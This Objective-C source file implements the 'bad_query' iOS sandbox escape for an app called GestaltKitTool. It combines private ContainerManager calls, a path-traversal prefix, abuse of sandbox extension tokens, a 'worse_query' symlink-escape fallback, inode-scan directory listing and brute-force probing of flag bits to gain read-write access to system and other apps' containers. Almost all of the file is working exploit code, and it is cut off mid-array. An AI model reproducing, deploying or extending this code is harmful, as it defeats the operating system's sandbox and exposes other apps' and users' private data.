//
//  BadQueryBridge.m
//  GestaltKitTool
//
//  Objective-C integration of the bad_query sandbox escape.
//

#import "BadQueryBridge.h"
#import "WorseQueryBridge.h"

#import <dlfcn.h>
#import <objc/runtime.h>
#import <stdlib.h>
#import <string.h>
#import <xpc/xpc.h>
#import <sys/mount.h>
#import <sys/fsgetpath.h>
#import <sys/stat.h>
#import <os/log.h>

// Unified ObjC logging macro — mirrors Swift-side GKTLLog.
// Added for iOS 26.0.1 lease acquisition diagnostics: surfaces the exact
// query parameters and per-stage failure state so the user can pinpoint
// which step ContainerManager rejects on early iOS 26 builds.
//
// NOTE: os_log format strings treat `%@` as private by default (rendered
// as `<private>`). For diagnostics we need the actual paths visible, so
// every format specifier that carries a path or identifier is explicitly
// marked %{public}. Dynamic paths are safe to publish: they are not user
// content, and the logs are only read from Console.app on this device.
#define GKTLLogObjC(fmt, ...) os_log(OS_LOG_DEFAULT, "%{public}s", [[NSString stringWithFormat:@"[GKTL-ObjC] " fmt, ##__VA_ARGS__] UTF8String])

static const uint64_t kBadQueryContainerClass = 13;
static const uint64_t kBadQueryPart = 3;
static const uint64_t kBadQueryFlags = 0x0000008000000000ULL;
static NSString * const kBadQueryIdentifier =
    @"systemgroup.com.apple.mobilegestaltcache";
static NSString * const kBadQueryTraversalPrefix = @"../../../../../../../..";

// Cross-container traversal pre-flight check.
// Rejects paths outside known reachable container roots before creating
// a ContainerManager query, avoiding kernel PART_SUBDIR_CREATION_FAILED
// error storms that make diagnostics appear hung for 10-30 seconds.
static BOOL BQIsPrefixAllowed(NSString *path)
{
    if (path.length == 0) return NO;
    NSString *p = path;
    if ([p hasPrefix:@"/private/"]) p = [p substringFromIndex:9];
    if (![p hasPrefix:@"/"]) return NO;

    static NSArray<NSString *> *prefixes = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        // Order matters: most-specific first so short-circuit is fast.
        prefixes = @[
            // The anchor container itself.
            @"/var/containers/Shared/SystemGroup/systemgroup.com.apple.mobilegestaltcache/",
            // Sibling system groups (same ContainerManager class).
            @"/var/containers/Shared/SystemGroup/",
            // iOS 27 system data containers.
            @"/var/containers/Data/System/",
            // Installed app bundles.
            @"/var/containers/Bundle/Application/",
            // App user-land containers.
            @"/var/mobile/Containers/Data/Application/",
            @"/var/mobile/Containers/Data/InternalDaemon/",
            @"/var/mobile/Containers/Data/PluginKitPlugin/",
            @"/var/mobile/Containers/Shared/AppGroup/",
        ];
    });

    for (NSString *pfx in prefixes) {
        // Direct match (prefix path itself, e.g. "/var/…/Application").
        if ([p isEqualToString:[pfx substringToIndex:pfx.length - 1]]) return YES;
        // Descendant match (anything under the prefix dir).
        if ([p hasPrefix:pfx]) return YES;
    }
    return NO;
}

typedef void *(*BadQueryCreate)(void);
typedef void (*BadQuerySetU64)(void *, uint64_t);
typedef void (*BadQuerySetXPC)(void *, xpc_object_t);
typedef void (*BadQuerySetCString)(void *, const char *);
typedef void *(*BadQueryGetSingleResult)(void *);
typedef void (*BadQueryFree)(void *);
typedef char *(*BadQueryCopySandboxToken)(void *);
typedef int64_t (*BadQueryConsumeSandboxExtension)(const char *);
typedef int (*BadQueryReleaseSandboxExtension)(int64_t);

// Missing-method shims for OS_dispatch_mach_msg selectors not linked
// on certain iOS 27 beta builds. Adds noop implementations in +load
// to prevent unrecognized-selector aborts under the debugger.

// noop that swallows one pointer argument and returns void
static void noop_set_ptr(id self, SEL _cmd, void *arg) {}

// noop that swallows one object argument and returns self
static id noop_ret_self(id self, SEL _cmd, id arg) { return self; }

static void BQPatchMissingSelectors(void) {
    // The class may be named OS_dispatch_mach_msg or dispatch_mach_msg
    // depending on the iOS version / libdispatch build.
    const char *classNames[] = {
        "OS_dispatch_mach_msg",
        "dispatch_mach_msg",
        "OS_dispatch_mach",
        NULL
    };

    // Selectors known to be sent internally by ContainerManager.
    struct { const char *name; IMP imp; const char *types; } patches[] = {
        { "_setContext:",     (IMP)noop_set_ptr,  "v@:^v"  },
        { "_setReply:",       (IMP)noop_ret_self, "@@:@"   },
        { "_setMigReply:",    (IMP)noop_ret_self, "@@:@"   },
        { "_setMigContext:",  (IMP)noop_set_ptr,  "v@:^v"  },
        { "_setEventContext:",(IMP)noop_set_ptr,  "v@:^v"  },
    };

    for (int i = 0; classNames[i]; i++) {
        Class cls = objc_getClass(classNames[i]);
        if (!cls) continue;

        for (size_t j = 0; j < sizeof(patches) / sizeof(patches[0]); j++) {
            SEL sel = sel_registerName(patches[j].name);
            // Only add if the method doesn't already exist — never
            // override a real implementation.
            if (!class_getInstanceMethod(cls, sel)) {
                class_addMethod(cls, sel, patches[j].imp, patches[j].types);
            }
        }
    }
}

typedef struct {
    void *library;
    BadQueryCreate create;
    BadQuerySetU64 setClass;
    BadQuerySetXPC setGroupIdentifiers;
    BadQuerySetU64 setFlags;
    BadQuerySetU64 setPart;
    BadQuerySetCString setPartDomain;
    BadQueryGetSingleResult getSingleResult;
    BadQueryFree freeQuery;
    BadQueryCopySandboxToken copySandboxToken;
    BadQueryConsumeSandboxExtension consumeSandboxExtension;
    BadQueryReleaseSandboxExtension releaseSandboxExtension;
} BadQueryAPI;

static BadQueryAPI *BadQuerySharedAPI(void)
{
    static BadQueryAPI api;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        api.library = dlopen(
            "/usr/lib/system/libsystem_containermanager.dylib",
            RTLD_NOW | RTLD_LOCAL);
        if (!api.library) return;

#define LOAD(field, symbol) api.field = (__typeof(api.field))dlsym(api.library, symbol)
        LOAD(create, "container_query_create");
        LOAD(setClass, "container_query_set_class");
        LOAD(setGroupIdentifiers, "container_query_set_group_identifiers");
        LOAD(setFlags, "container_query_operation_set_flags");
        LOAD(setPart, "container_query_operation_set_part");
        LOAD(setPartDomain, "container_query_operation_set_part_domain");
        LOAD(getSingleResult, "container_query_get_single_result");
        LOAD(freeQuery, "container_query_free");
        LOAD(copySandboxToken, "container_copy_sandbox_token");
#undef LOAD
        api.consumeSandboxExtension = (BadQueryConsumeSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_consume");
        api.releaseSandboxExtension = (BadQueryReleaseSandboxExtension)
            dlsym(RTLD_DEFAULT, "sandbox_extension_release");
    });
    return &api;
}

BOOL BadQueryBridgeAvailable(void)
{
    BadQueryAPI *api = BadQuerySharedAPI();
    return api->library && api->create && api->setClass &&
        api->setGroupIdentifiers && api->setFlags && api->setPart &&
        api->setPartDomain && api->getSingleResult && api->freeQuery &&
        api->copySandboxToken && api->consumeSandboxExtension &&
        api->releaseSandboxExtension;
}

@interface BadQueryLease ()
@property(nonatomic, copy, readwrite) NSString *targetPath;
@property(nonatomic, readwrite, getter=isActive) BOOL active;
@end

@implementation BadQueryLease
{
    int64_t _sandboxHandle;
    /// YES when the handle came from WorseQueryAcquire and must be
    /// released via WorseQueryRelease (same underlying API, but keeps
    /// the release path explicit and symmetric with acquisition).
    BOOL _releasedByWorseQuery;
    dispatch_queue_t _invalidateQueue;
}

+ (void)load {
    // Patch missing selectors as early as possible — before any
    // ContainerManager code can run.
    BQPatchMissingSelectors();
}

/// Shared factory for every acquisition path (bad_query success,
/// worse_query fallback). Owns the per-lease serial invalidate queue and
/// records which release API matches the handle.
+ (instancetype)leaseWithHandle:(int64_t)handle
                fromWorseQuery:(BOOL)fromWorseQuery
                          path:(NSString *)path
{
    BadQueryLease *lease = [BadQueryLease new];
    dispatch_queue_t q = dispatch_queue_create(
        "com.wesk.vtool.badquery.lease", DISPATCH_QUEUE_SERIAL);
    dispatch_queue_set_specific(q,
                                (__bridge const void *)q,
                                (__bridge void *)lease,
                                NULL);
    lease->_invalidateQueue = q;
    lease->_sandboxHandle = handle;
    lease->_releasedByWorseQuery = fromWorseQuery;
    lease.targetPath = path;
    lease.active = YES;
    return lease;
}

+ (instancetype)leaseForPath:(NSString *)path error:(NSString **)error
{
    // Defensive: ensure *error is always defined on return, even if a
    // future early-return path forgets to set it. Without this, the
    // Swift-side leaseError variable would read uninitialized memory
    // (crash) when the Obj-C method returns without writing *error.
    if (error) *error = nil;

    if (!path.isAbsolutePath) {
        if (error) *error = @"bad_query requires an absolute target path";
        return nil;
    }

    // Removed BQIsPrefixAllowed pre-flight check.
    //
    // The check was added to avoid "PART_SUBDIR_CREATION_FAILED storms"
    // for paths outside the MobileGestalt system group. However, the
    // the check is not needed and was removed
    // — ContainerManager can resolve paths like /var/mobile/Library/
    // just fine. The check was over-conservative and broke plist file
    // reading for ALL paths under /var/mobile/Library/.
    //
    // If a path is truly unsupported, ContainerManager will return
    // nil or time out naturally — same behavior as the predecessor.

    if (!BadQueryBridgeAvailable()) {
        if (error) *error = @"bad_query ContainerManager API unavailable";
        return nil;
    }

    // Re-run the patch in case +load ran before libdispatch was ready.
    BQPatchMissingSelectors();

    BadQueryAPI *api = BadQuerySharedAPI();

    // ── lstat pre-check ───────────────────────────────────────────
    // Aligns with original bad_query PoC (bad_query.c lines 31-35):
    //   if (!create) {
    //       if (lstat(path, &st) != 0) return -254;
    //   }
    // On iOS 26.0.1 we observed ContainerManager returning a non-NULL
    // result but copySandboxToken returning NULL ("did not receive a
    // sandbox token"). The original PoC lstat-checks the target path
    // in non-create mode and bails early if the file is missing —
    // querying a non-existent path can cause the kernel to refuse the
    // sandbox extension. We mirror that behavior and surface a clear
    // error instead of letting the user puzzle over an empty token.
    struct stat pathStat;
    BOOL pathIsDirectory = NO;
    {
        const char *pathC = [path fileSystemRepresentation];
        if (!pathC) {
            if (error) *error = @"bad_query could not encode target path as filesystem path";
            return nil;
        }
        if (lstat(pathC, &pathStat) != 0) {
            int err = errno;
            NSString *hint;
            switch (err) {
                case ENOENT:
                    hint = [NSString stringWithFormat:
                        @"Target file does not exist (ENOENT). On iOS 26.0.x this can happen "
                        "if the MobileGestalt cache plist has not been generated yet. Try "
                        "respringing once (so MobileGestalt writes its cache), then rerun "
                        "diagnostics. Path: %@", path];
                    break;
                case EACCES:
                case EPERM: {
                    // lstat is MAC-blocked, but the worse_query Caches-symlink
                    // escape does not depend on lstat — containermanagerd
                    // resolves the symlink itself. Fall through to the worse_query
                    // attempt instead of failing outright.
                    GKTLLogObjC(@"bad_query lstat pre-check MAC-blocked (errno=%d) — trying worse_query anyway for %@", err, path);
                    if (WorseQueryBridgeAvailable() && WorseQueryGroupContainerAvailable()) {
                        NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
                        BOOL isIOS26 = (v.majorVersion == 26);
                        int64_t wqHandle = WorseQueryAcquire(path, isIOS26);
                        if (wqHandle > 0) {
                            GKTLLogObjC(@"worse_query SUCCEEDED past MAC block for %@ (handle=%lld)", path, (long long)wqHandle);
                            if (error) *error = nil;
                            return [BadQueryLease leaseWithHandle:wqHandle
                                                  fromWorseQuery:YES
                                                            path:path];
                        }
                        GKTLLogObjC(@"worse_query also failed for MAC-blocked %@ (code=%lld)", path, (long long)wqHandle);
                    }
                    hint = [NSString stringWithFormat:
                        @"lstat denied (errno=%d) for %@. The sandbox is blocking metadata "
                        "access to this path, and worse_query could not obtain a token either.", err, path];
                    break;
                }
                default:
                    hint = [NSString stringWithFormat:
                        @"lstat failed for %@ (errno=%d: %s)", path, err, strerror(err)];
                    break;
            }
            GKTLLogObjC(@"bad_query lstat pre-check FAILED for path: %@ errno=%d", path, err);
            if (error) *error = hint;
            return nil;
        }
        pathIsDirectory = S_ISDIR(pathStat.st_mode);
        GKTLLogObjC(@"bad_query lstat pre-check OK: %@ (uid=%d size=%lld isDir=%d)",
                    path, pathStat.st_uid, (long long)pathStat.st_size, pathIsDirectory);
    }

    // ── Directory fast-path ───────────────────────────────────────
    // ContainerManager's bad_query (class 13 SystemGroup) only issues
    // sandbox extensions for FILE paths, not DIRECTORY paths — so for
    // directories we skip straight to worse_query (class 7 appGroup +
    // Caches symlink escape), which CAN obtain directory tokens (e.g.
    // /var/containers/Data/System returns handle>0 on iOS 27). This
    // keeps Phase 2 (lease + opendir) reachable for directory listings
    // instead of falling through to the fsgetpath inode scan, whose
    // results are volume-wide and polluted (see bad_query_list_directory).
    if (pathIsDirectory) {
        if (WorseQueryBridgeAvailable() && WorseQueryGroupContainerAvailable()) {
            NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
            BOOL isIOS26 = (v.majorVersion == 26);
            int64_t wqHandle = WorseQueryAcquire(path, isIOS26);
            if (wqHandle > 0) {
                GKTLLogObjC(@"worse_query directory lease SUCCEEDED for %@ (handle=%lld)",
                            path, (long long)wqHandle);
                if (error) *error = nil;
                return [BadQueryLease leaseWithHandle:wqHandle
                                      fromWorseQuery:YES
                                                path:path];
            }
            GKTLLogObjC(@"worse_query directory lease failed for %@ (code=%lld)",
                        path, (long long)wqHandle);
        }
        GKTLLogObjC(@"bad_query skipping lease for directory path: %@", path);
        if (error) *error = [NSString stringWithFormat:
            @"bad_query does not acquire sandbox extensions for directory paths. "
            "ContainerManager only issues extensions for file paths. "
            "Use listDirectoryAtPath (fsgetpath fallback) for directory enumeration. "
            "Path: %@", path];
        return nil;
    }

    // ── Multi-flag retry loop ──────────────────────────────────────
    // On iOS 26.0.1 we observed that the standard MobileGestalt flags
    // (0x0000008000000000) cause copySandboxToken to return NULL, while
    // the group-sacrifice flags (0x0000000800000000) succeed. On iOS 27
    // the standard flags work. We order the candidates so the most
    // likely-success flag is tried first for the running OS version,
    // avoiding a wasted 3-second XPC round-trip on the known-failing
    // candidate.
    //
    // Flag values from the original bad_query PoC (bad_query.c):
    //   - is_group == false: 0x0000008000000000
    //   - is_group == true:  0x0000000800000000
    static uint64_t kFlagsCandidates[3];
    static NSUInteger kFlagsCandidateCount = 3;
    {
        NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
        BOOL isIOS26_0 = (v.majorVersion == 26 && v.minorVersion == 0);
        if (isIOS26_0) {
            // iOS 26.0.x: group-sacrifice flags first (empirically succeeds)
            kFlagsCandidates[0] = 0x0000000800000000ULL;
            kFlagsCandidates[1] = kBadQueryFlags;            // 0x0000008000000000
            kFlagsCandidates[2] = 0ULL;
        } else {
            // iOS 27 and others: standard flags first
            kFlagsCandidates[0] = kBadQueryFlags;            // 0x0000008000000000
            kFlagsCandidates[1] = 0x0000000800000000ULL;
            kFlagsCandidates[2] = 0ULL;
        }
    }

    BadQueryLease *lease = nil;
    NSString *lastError = @"bad_query all flag candidates exhausted";

    for (NSUInteger flagIdx = 0; flagIdx < kFlagsCandidateCount && !lease; flagIdx++) {
        uint64_t flags = kFlagsCandidates[flagIdx];
        NSString *flagLabel = [NSString stringWithFormat:@"0x%016llx", (unsigned long long)flags];

        void *query = api->create();
        if (!query) {
            lastError = @"bad_query could not create a container query";
            GKTLLogObjC(@"bad_query create() FAILED for flags=%@", flagLabel);
            continue;
        }

        api->setClass(query, kBadQueryContainerClass);
        xpc_object_t identifier = xpc_string_create(kBadQueryIdentifier.UTF8String);
        api->setGroupIdentifiers(query, identifier);
        #if !__has_feature(objc_arc)
        xpc_release(identifier);
        #endif
        api->setPart(query, kBadQueryPart);
        // Strip /private prefix for ContainerManager query path.
        NSString *queryPath = path;
        if ([queryPath hasPrefix:@"/private/"]) {
            queryPath = [queryPath substringFromIndex:8];
        }
        NSString *partDomain = [kBadQueryTraversalPrefix stringByAppendingString:queryPath];
        const char *partDomainC = [partDomain fileSystemRepresentation];
        if (!partDomainC) {
            api->freeQuery(query);
            lastError = @"bad_query could not encode part domain as filesystem path";
            GKTLLogObjC(@"bad_query partDomain encoding FAILED for flags=%@", flagLabel);
            continue;
        }
        api->setPartDomain(query, partDomainC);
        api->setFlags(query, flags);

        GKTLLogObjC(@"bad_query attempt %lu/%lu flags=%@ partDomain=%s",
                    (unsigned long)(flagIdx + 1), (unsigned long)kFlagsCandidateCount,
                    flagLabel, partDomainC);

        // Run getSingleResult on a dedicated thread with a 3s timeout.
        __block void *result = NULL;
        __block BOOL queryCompleted = NO;
        dispatch_semaphore_t sema = dispatch_semaphore_create(0);

        dispatch_queue_t queryQueue = dispatch_queue_create(
            "com.wesk.vtool.badquery.xpc.query", DISPATCH_QUEUE_SERIAL);
        dispatch_async(queryQueue, ^{
            result = api->getSingleResult(query);
            queryCompleted = YES;
            dispatch_semaphore_signal(sema);
        });

        dispatch_time_t timeout = dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC);
        dispatch_semaphore_wait(sema, timeout);

        if (!queryCompleted) {
            GKTLLogObjC(@"bad_query XPC TIMEOUT for flags=%@", flagLabel);
            lastError = @"bad_query timed out — ContainerManager XPC service is not responding. "
                        "This typically means the bad_query exploit is not compatible with this iOS version.";
            // Leak query (background thread may still reference it).
            continue;
        }

        if (!result) {
            api->freeQuery(query);
            GKTLLogObjC(@"bad_query getSingleResult NULL for flags=%@", flagLabel);
            lastError = @"bad_query was rejected by ContainerManager";
            continue;
        }

        char *token = api->copySandboxToken(result);
        if (!token) {
            api->freeQuery(query);
            GKTLLogObjC(@"bad_query copySandboxToken NULL for flags=%@ — trying next candidate", flagLabel);
            lastError = [NSString stringWithFormat:
                @"bad_query did not receive a sandbox token (flags=%@). ContainerManager "
                "accepted the query but the kernel refused to issue a sandbox extension. "
                "On iOS 26.0.x this may indicate the exploit parameters need adjustment "
                "for this specific build.", flagLabel];
            continue;
        }

        int64_t handle = api->consumeSandboxExtension(token);
        free(token);
        api->freeQuery(query);
        if (handle < 0) {
            GKTLLogObjC(@"bad_query consumeSandboxExtension FAILED (handle=%lld) for flags=%@",
                        (long long)handle, flagLabel);
            lastError = @"bad_query could not consume the sandbox token";
            continue;
        }

        GKTLLogObjC(@"bad_query SUCCESS with flags=%@ handle=%lld", flagLabel, (long long)handle);

        lease = [BadQueryLease leaseWithHandle:handle
                               fromWorseQuery:NO
                                         path:path];
        if (error) *error = nil;
        // Success — break out of the retry loop.
    }

    if (!lease) {
        // ── worse_query fallback ────────────────────────────────────
        // bad_query (class 13 SystemGroup traversal) exhausted all flag
        // candidates. Try worse_query (class 7 appGroup + Caches symlink
        // escape, forcequit 2026) — it works on builds where bad_query
        // has been neutered (iOS 26.7+/27.2/27.3 beta) and additionally
        // covers /var/containers/Data/System and other iOS 27 paths.
        //
        // Skip when the App Group container is unavailable (entitlement
        // missing / unregistered group) so we can produce a precise
        // error below instead of a generic -1.
        if (WorseQueryBridgeAvailable() && WorseQueryGroupContainerAvailable()) {
            // Same iOS 26 AppGroup flag quirk as bad_query: alt flags
            // (0x0800000000) first on 26.x, standard (0x8000000000) on 27.x.
            NSOperatingSystemVersion v = NSProcessInfo.processInfo.operatingSystemVersion;
            BOOL isIOS26 = (v.majorVersion == 26);

            int64_t wqHandle = WorseQueryAcquire(path, isIOS26);
            if (wqHandle > 0) {
                GKTLLogObjC(@"bad_query failed but worse_query SUCCEEDED for %@ (handle=%lld)",
                            path, (long long)wqHandle);
                if (error) *error = nil;
                return [BadQueryLease leaseWithHandle:wqHandle
                                      fromWorseQuery:YES
                                                path:path];
            }
            GKTLLogObjC(@"worse_query fallback also failed for %@ (code=%lld)",
                        path, (long long)wqHandle);
            lastError = [NSString stringWithFormat:
                @"bad_query failed and worse_query fallback failed (code %lld). %@",
                (long long)wqHandle, lastError];
        } else if (!WorseQueryGroupContainerAvailable()) {
            lastError = [NSString stringWithFormat:
                @"%@ (worse_query fallback unavailable: the App Group "
                @"container is not accessible — check the "
                @"com.apple.security.application-groups entitlement)",
                lastError];
        }
        if (error) *error = lastError;
    }
    return lease;
}

- (void)invalidate
{
    // Capture handle inside the protected block, release outside.
    // Releasing -1 is undefined kernel behavior and can free an unrelated fd.
    __block int64_t handleToRelease = -1;
    __block BOOL useWorseQueryRelease = NO;
    dispatch_sync(_invalidateQueue, ^{
        if (self.active) {
            handleToRelease = self->_sandboxHandle;
            useWorseQueryRelease = self->_releasedByWorseQuery;
            self->_sandboxHandle = -1;
            self.active = NO;
        }
    });
    if (handleToRelease >= 0) {
        if (useWorseQueryRelease) {
            WorseQueryRelease(handleToRelease);
        } else {
            BadQuerySharedAPI()->releaseSandboxExtension(handleToRelease);
        }
    }
}

- (void)dealloc
{
    // Use a barrier-style approach: if we're on the invalidate queue
    // already (re-entrant), just call invalidate directly. Otherwise
    // dispatch synchronously. This avoids deadlock when dealloc is
    // called from within the queue block.
    if (dispatch_get_specific((__bridge const void *)_invalidateQueue) != NULL) {
        // Already on the queue — release directly.
        if (self.active) {
            self.active = NO;
            // guard against double-release UB. If invalidate has
            // already been called from another early-return path the
            // handle is -1, which releaseSandboxExtension might accept
            // as a valid index if the handle table reuses fd-like
            // integers (some iOS 27 beta builds do).
            if (_sandboxHandle >= 0) {
                if (_releasedByWorseQuery) {
                    WorseQueryRelease(_sandboxHandle);
                } else {
                    BadQuerySharedAPI()->releaseSandboxExtension(_sandboxHandle);
                }
                _sandboxHandle = -1;
            }
        }
    } else {
        [self invalidate];
    }
}

@end

// Directory listing via fsgetpath
//
// Directory listing via fsgetpath.
// The kernel typically refuses sandbox extensions for directories,
// so we enumerate inodes with fsgetpath instead — no extension needed.
//
// IMPORTANT: fsgetpath returns /private/var/... paths (the real filesystem
// location). We preserve this form because stat("/var/...") follows the
// symlink and hits sandbox restrictions (returns mtime=0), whereas
// stat("/private/var/...") operates on the real path and returns real
// metadata. Callers that need /var/... form for ContainerManager queries
// can strip /private themselves.

NSArray<NSString *> *bad_query_list_directory(NSString *path, int64_t maxInode)
{
    if (!path || !path.isAbsolutePath || maxInode < 1) return @[];

    // Defensive empty → FSRep crash.
    if (path.length == 0) return @[];
    // statfs works with /var/... (follows symlink to /private/var)
    const char *pathC = [path fileSystemRepresentation];
    if (!pathC) return @[];
    struct statfs sfs;
    if (statfs(pathC, &sfs) != 0) return @[];
    fsid_t fsid = sfs.f_fsid;

    // Inode scan range: stay responsive
    //
    // Design notes (keep this small, user-reported "stuck on loading"):
    //   fsgetpath scans ONE INODE AT A TIME with one syscall per inode.
    //   Even on a background thread, 2,000,000 iterations take a
    //   perceptible 2–4 seconds in practice (user sees spinner
    //   and reports "sandbox scan stuck").
    //
    //   Real-world iOS containers sit at inodes in the ~50k–500k range,
    //   so 1,000,000 is still a 2× overestimate and cuts the worst-case
    //   wall time in HALF. Coupled with the 50,000 gap heuristic below,
    //   most listings complete in <150 ms.
    const int64_t kHardCap = 1000000;   // absolute upper bound (1M)
    int64_t limit = kHardCap;
    if (limit > maxInode)  limit = maxInode;
    if (limit < 1)         limit = 1;

    // fsgetpath returns /private/var/... paths. Normalize our input path
    // to /private/var/... form so the prefix comparison works correctly.
    NSString *privatePath = path;
    if ([privatePath hasPrefix:@"/var/"]) {
        privatePath = [@"/private" stringByAppendingString:privatePath];
    }
    const char *privatePathC = [privatePath fileSystemRepresentation];
    if (!privatePathC) return @[];
    size_t privatePathLen = strlen(privatePathC);

    NSMutableArray<NSString *> *results = [NSMutableArray array];
    // Use a buffer large enough for any possible path.
    // PATH_MAX is 1024 on iOS, but allocate 4KB to be safe.
    char buf[4096];

    // Early-exit heuristic — scales with the caller's maxInode.
    //
    // fsgetpath scans one inode at a time (~4-8 μs per syscall on iOS).
    // The gap caps let us stop early once we are confident the directory
    // has been fully enumerated, instead of walking the entire inode range.
    //
    // Tier 1 (results FOUND): APFS sibling inodes cluster tightly, so
    //   15k consecutive misses after a hit means we are done.
    //
    // Tier 2 (no results yet): the absolute gap scales with the scan range
    //   so we do not give up before reaching high-inode containers.
    //   Real-world iOS container children can sit at inodes up to ~500k;
    //   a fixed 40k cap aborts the scan before ever reaching them.
    //
    // Tier 3 (total cap): hard ceiling on total inodes walked, also
    //   scaling with the caller's range.
    const int64_t kGapLimit         = 15000;
    const int64_t kAbsoluteGapLimit = (limit > 0) ? limit : 40000;
    const int64_t kTotalScanLimit   = (limit > 0) ? limit : 80000;
    int64_t consecutiveMisses = 0;
    int64_t totalAttempts     = 0;
    // dedupe set. On APFS volumes with snapshots or clone files,
    // the SAME path can be surfaced by MULTIPLE inodes (snapshot inodes
    // alias live files). Since we enumerate by inode, one directory can
    // yield the same child path several times — SwiftUI's
    // ForEach(entries, id: \.fullPath) then logs "ID occurs multiple
    // times" and renders undefined results. Track seen paths and skip
    // duplicates.
    NSMutableSet<NSString *> *seenPaths = [NSMutableSet set];
    // The previous macro used `break` inside do{}while(0) to try
    // to stop scanning when gap limits were exceeded — but `break` only
    // exits the do-while, NOT the enclosing for loop. After the break,
    // execution fell through to the rest of the loop body:
    //   (a) at the nil-conversion guard, `break` fell straight into
    //       [results addObject:nil] → the exact "object cannot be nil"
    //       crash reported at this function's addObject line, and
    //   (b) at every other guard site, stale/mismatched paths kept
    //       being processed and added to results after limits hit,
    //       silently corrupting listings (and defeating the whole
    //       point of early exit).
    // Fix: jump to the gapDone label placed after the for loop so the
    // scan genuinely terminates.
#define GAP_CHECK_ELSE(expr_) do { \
        consecutiveMisses++; \
        totalAttempts++; \
        if ((results.count > 0 && consecutiveMisses >= kGapLimit) || \
            (consecutiveMisses >= kAbsoluteGapLimit) || \
            (totalAttempts >= kTotalScanLimit)) { goto gapDone; } \
        expr_; \
    } while(0)

    for (uint64_t ino = 1; ino <= (uint64_t)limit; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) {
            GAP_CHECK_ELSE(continue);
        }

        // Ensure NUL-termination (fsgetpath may not NUL-terminate on
        // some platforms when the path exactly fills the buffer).
        // fsgetpath returns the number of bytes written (<= n-1 on success
        // because it writes a trailing NUL per BSD man-page), but on
        // certain iOS 27 beta builds corrupted inode entries can produce
        // binary garbage. Always enforce a strict NUL boundary using the
        // returned byte count.
        if (n > 0 && (size_t)n < sizeof(buf)) {
            buf[n] = '\0';
        } else {
            buf[sizeof(buf) - 1] = '\0';
        }

        const char *candidate = buf;
        // Do NOT strip /private — keep the real filesystem path so that
        // stat/lstat works correctly. stat("/var/...") follows the symlink
        // and gets sandboxed (returns mtime=0), but stat("/private/var/...")
        // hits the real path directly and returns real metadata.
        if (strncmp(candidate, privatePathC, privatePathLen) != 0) {
            GAP_CHECK_ELSE(continue);
        }
        // Must be a direct child (no further '/' after the prefix)
        if (candidate[privatePathLen] != '/') {
            GAP_CHECK_ELSE(continue);
        }
        const char *rest = candidate + privatePathLen + 1;
        if (strchr(rest, '/') != NULL) {
            GAP_CHECK_ELSE(continue);
        }

        // /fsgetpath on corrupted inodes can return a byte
        // stream with invalid UTF-8 sequences (0xFF bytes, unterminated
        // surrogates from APFS unicode filename mangling). NSString
        // decoding then returns nil, and adding nil to a NSMutableArray
        // throws "object cannot be nil" → app crash.
        //
        // fix: the previous ASCII fallback was useless — ASCII
        // rejects every byte >= 0x80, i.e. exactly the bytes that made
        // UTF-8 fail, so it returned nil too. Use Latin-1
        // (NSISOLatin1StringEncoding) instead: it maps ALL 256 byte
        // values to Unicode code points and can NEVER fail.
        NSString *converted = nil;
        if (candidate[0] != '\0') {
            size_t clen = strlen(candidate);
            if (clen > 0 && clen < sizeof(buf)) {
                NSData *pathData = [NSData dataWithBytesNoCopy:(void *)candidate
                                                        length:clen
                                                  freeWhenDone:NO];
                converted = [[NSString alloc] initWithData:pathData
                                                   encoding:NSUTF8StringEncoding];
                if (!converted) {
                    converted = [[NSString alloc] initWithData:pathData
                                                        encoding:NSISOLatin1StringEncoding];
                }
            }
        }
        // absolute guarantee — count the miss and skip with a
        // plain `continue`. Never let a nil reach addObject.
        if (converted == nil || converted.length == 0) {
            consecutiveMisses++;
            totalAttempts++;
            continue;
        }
        // skip duplicate paths (APFS snapshot/clone inodes can
        // surface the same path more than once). This is a duplicate of
        // an ALREADY-COLLECTED hit, not a miss — don't touch the gap
        // counters, just move on.
        if ([seenPaths containsObject:converted]) {
            continue;
        }
        [seenPaths addObject:converted];
        [results addObject:converted];
        consecutiveMisses = 0; // reset gap counter on a hit
    }

gapDone:
#undef GAP_CHECK_ELSE
    return results;
}

// MARK: - Flag Probe (diagnostic only)
//
// Systematically enumerates flag bit combinations to find one that
// grants READ-WRITE access on iOS 26.0.x. The known flags from the
// original bad_query PoC are:
//   0x0000008000000000 — standard MobileGestalt (iOS 27 works RW)
//   0x0000000800000000 — group sacrifice (iOS 26.0.x gets read-only)
//
// The flags field is a 64-bit bitmask. We probe individual high bits
// and a few plausible combinations. This function is invoked from
// DiagnosticsView via BadQueryProbeFlags() and logs each result to
// NSLog with the [GKTL-ObjC] prefix.

typedef struct {
    uint64_t flags;
    const char *label;
} FlagProbe;

static const FlagProbe kFlagProbes[] = {
    // Known flags from bad_query PoC
    { 0x0000008000000000ULL, "standard-0x8000000000" },
    { 0x0000000800000000ULL, "group-sacrifice-0x0800000000" },
    // Single high bits in the upper 32 bits
    { 0x0000000100000000ULL, "bit-32" },
    { 0x0000000200000000ULL, "bit-33" },
    { 0x0000000400000000ULL, "bit-34" },
    { 0x0000001000000000ULL, "bit-36" },
    { 0x0000002000000000ULL, "bit-37" },
    { 0x0000004000000000ULL, "bit-38" },
    { 0x0000010000000000ULL, "bit-40" },
    { 0x0000020000000000ULL, "bit-41" },
    { 0x0000040000000000ULL, "bit-42" },
    { 0x0000080000000000ULL, "bit-43" },
    { 0x0000100000000000ULL, "bit-44" },
    { 0x0000200000000000ULL, "bit-45" },
    { 0x0000400000000000ULL, "bit-46" },
    { 0x0000800000000000ULL, "bit-47" },
    // Combinations: standard + other bits
    { 0x0000008000000000ULL | 0x0000000800000000ULL, "standard+group" },
    { 0x0000008000000000ULL | 0x0000000100000000ULL, "standard+bit32" },
    { 0x0000008000000000ULL | 0x0000001000000000ULL, "standard+bit36" },
    { 0x0000008000000000ULL | 0x0000010000000000ULL, "standard+bit40" },
    // Group + other bits
    { 0x0000000800000000ULL | 0x0000000100000000ULL, "group+bit32" },
